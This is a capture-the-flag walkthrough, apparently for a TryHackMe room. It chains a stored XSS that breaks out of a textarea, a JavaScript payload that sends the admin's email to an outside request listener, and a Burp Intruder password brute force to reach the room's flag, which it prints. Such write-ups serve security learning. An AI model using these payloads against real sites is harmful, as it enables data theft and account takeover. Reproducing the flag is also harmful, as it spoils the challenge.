# That’s The Ticket 

### Difficulty: Medium

### Description

This room demonstrates how several small weaknesses can be chained into an account takeover. The attack path is:

**Web enumeration → stored XSS → breaking out of a `<textarea>` → DNS-based exfiltration → admin email discovery → password brute-force → admin access → flag.**

---

## 1. Reconnaissance

We begin by scanning the target to identify exposed services.

```bash
nmap -sV 10.128.174.140
```

The scan reveals:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```

Only two ports are exposed:

- **22/tcp — SSH**
    
- **80/tcp — HTTP**
    

SSH isn't immediately useful, so the web application on port 80 becomes our primary attack surface.

**Key takeaway:**  
A small number of open ports doesn't necessarily mean a small attack surface. A single web application can contain multiple vulnerabilities, so we should enumerate it thoroughly.

---

# 2. Web Enumeration

Next, we perform directory enumeration against the web server.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
-u "http://10.130.145.227/FUZZ" \
-fc 404,302 -c
```

The interesting results are:

```text
login       [Status: 200]
register    [Status: 200]
```

We now know that the application provides both registration and authentication functionality.

Since registration is available, we create a test account:

```text
Email:    user@user.com
Password: useruser
```

After logging in, we discover functionality for submitting **support tickets**.

This is interesting because ticket contents are presumably viewed by another user — potentially an administrator.

**Why this matters:**  
Whenever an application lets us submit content that another user will later view, we should consider client-side injection vulnerabilities such as XSS.

---

# 3. Discovering the Stored XSS

We first test the ticket field with a basic XSS payload:

```html
<script>alert('1')</script>
```

Nothing happens.

At first glance, this might suggest that the application is filtering `<script>` tags.

However, inspecting how the ticket content is rendered reveals something important: our input is placed inside a `<textarea>`.

For example:

```html
<textarea>
USER INPUT
</textarea>
```

Anything inside a `<textarea>` is interpreted as text rather than HTML.

So instead of trying to execute JavaScript from inside the textarea, we can **close the textarea first**:

```html
</textarea><script>alert('1')</script>
```

Now the browser interprets the injected `<script>` as actual HTML/JavaScript.

### Result

The alert executes.

**Stored XSS confirmed.**

This is more significant than reflected XSS because the payload is stored in the application. When the administrator later opens the malicious ticket, the browser executes our JavaScript in the administrator's context.

---

# 4. Finding the Admin's Email with DNS Exfiltration

Now we need to turn our XSS into something useful.

The application displays the logged-in user's email address in the page. The payload can therefore read that value from the DOM.

A request listener is prepared using **requestrepo.com** so that we can observe incoming requests.

The payload used in the ticket is:

```html
</textarea><script>
var email = document.getElementById("email").innerText;
email = email.replace("@", "0").replace(".", "x").trim();
new Image().src = "http://" + email + ".THIS_IS_FROM_WEBSITE";
</script><textarea>
```

Let's break down what's happening.

### Step 1 — Read the email

```javascript
document.getElementById("email").innerText
```

The JavaScript locates the element containing the user's email address and retrieves its contents.

### Step 2 — Make the email DNS-safe

An email such as:

```text
adminaccount@itsupport.thm
```

isn't suitable directly as a hostname.

The payload changes:

```text
@ → 0
. → x
```

giving:

```text
adminaccount0itsupportxthm
```

### Step 3 — Trigger an external request

```javascript
new Image().src = "http://" + email + ".THIS_IS_FROM_WEBSITE";
```

The browser attempts to resolve the generated hostname.

Because the hostname contains our encoded email address, the resulting DNS/request information allows us to recover the value.

The listener receives:

```text
adminaccount0itsupportxthm.0tlvjj5m.requestrepo.com
```

Reversing the substitutions gives:

```text
adminaccount@itsupport.thm
```

### Result

We have discovered the administrator's email address:

```text
adminaccount@itsupport.thm
```

**Important lesson:**  
XSS doesn't necessarily have to steal cookies. JavaScript running in another user's browser can also access information exposed in the page and send it through an external channel.

---

# 5. Brute-Forcing the Admin Login

Now we have the administrator's username/email, so the remaining problem is the password.

We capture the login request using **Burp Suite** and send it to Intruder.

The request looks like:

```text
email=adminaccount%40itsupport.thm&password=§test§
```

The `§test§` markers identify the password field as the value Burp should replace with each candidate password.

We then load the password list:

```text
/usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt
```

The important part isn't simply finding a password — we need to distinguish a successful login from the failed attempts.

The responses have different content lengths.

The successful response has:

```text
Length: 310
```

The corresponding credentials are:

```text
Email:    adminaccount@itsupport.thm
Password: 123123
```

We can now authenticate as the administrator.

---

# 6. Getting the Flag

After logging into the administrator account, we inspect the support tickets.

The first ticket contains the room's flag:

```text
THM{6804f45260135ec8418da2d906328473}
```

🏁 **Flag: `THM{6804f45260135ec8418da2d906328473}`**

---

# Attack Chain

The entire room can be summarized as:

```text
Port Scan
    ↓
Web Application
    ↓
Register Account
    ↓
Find Ticket Submission
    ↓
Stored XSS
    ↓
Break Out of <textarea>
    ↓
Read Admin Email from DOM
    ↓
DNS / Out-of-Band Exfiltration
    ↓
Discover adminaccount@itsupport.thm
    ↓
Burp Suite Intruder
    ↓
Password Brute-Force
    ↓
Admin Login
    ↓
Read Ticket
    ↓
FLAG
```

## What I learned

This room is a good example of why individual vulnerabilities don't always need to look catastrophic to become serious.

The stored XSS by itself gave us JavaScript execution in another user's browser. The DOM exposure gave that JavaScript something valuable to read. The DNS callback gave us an out-of-band channel to retrieve the information. Finally, the lack of effective authentication protections allowed the discovered administrator account to be brute-forced.

The main vulnerabilities were therefore:

- **Stored XSS**
    
- **Unsafe rendering inside a `<textarea>`**
    
- **Sensitive information exposed in the DOM**
    
- **Out-of-band/DNS exfiltration**
    
- **Weak administrator password**
    
- **Insufficient login rate limiting / brute-force protection**
    

The room ultimately demonstrates a complete chain from **low-level web enumeration to administrative account compromise**.